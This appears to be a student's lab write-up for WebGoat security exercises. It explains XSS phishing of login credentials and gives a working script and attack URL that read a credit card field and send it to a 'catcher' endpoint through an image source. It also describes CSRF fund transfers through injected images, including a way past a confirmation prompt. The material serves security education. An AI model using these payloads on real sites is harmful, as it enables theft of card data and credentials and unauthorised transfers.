#Ho Seok Lee, 1004112177, hoseok.lee@mail.utoronto.ca

Part 1 Explanation
- place custom fake HTMl form for log in credentials in XSS vulnerability
- log in information gained from fake form, which is then transferred to the 
  phisher's server i.e. "http://localhost:8090/WebGoat/catcher?..."
- simplest way to post the information is to create an HTML image and change
  the source URL of the image to the URL above with the phished information
- can also be done with XMLHttpRequest and POST

Part 2 Explanation
- credit card number located at input with name "input1"
- three digit access code located at input with name "input2"
- the script written below is the script that will be used to access the 
  vulnerability in the second input (access code) input2: it phishes for the 
  credit card number once the purchase button has been clicked

<script>
    function phish()
    {
        var phishedCreditCard = document.form.input1.value;

        var xss = new Image();
        xss.src = 'http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCardNum=' + new String(phishedCreditCard);
    }

	document.form.buy.setAttribute('onclick', 'phish()')
</script>

- below is the unencoded URL

http://localhost:8090/WebGoat/start.mvc#attack/SCREEN_ID/900?input1=123&input2=<script>function phish(){var phishedCreditCard = document.form.input1.value;var xss = new Image();xss.src = 'http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCardNum=' + new String(phishedCreditCard);}document.form.buy.setAttribute('onclick', 'phish()');</script>

Part 3 Explanation
- image with malicious source URL is injected into the expoloitable message
  content field, and stays dormant until someone clicks on it
- once a victim clicks on the message and loads the malicious image with the URL
  with the transfer funds field, the funds will be transferred

Part 4 Explanation
- in a similar fashion to part 3, the message section is vulnerable
- to by-pass the prompt, we can add a second image (that will load sequentially
  after the first image to ensure that the prompt confirmation hack will load 
  after the transfer request) that sets transfer=CONFIRMED to by-pass the prompt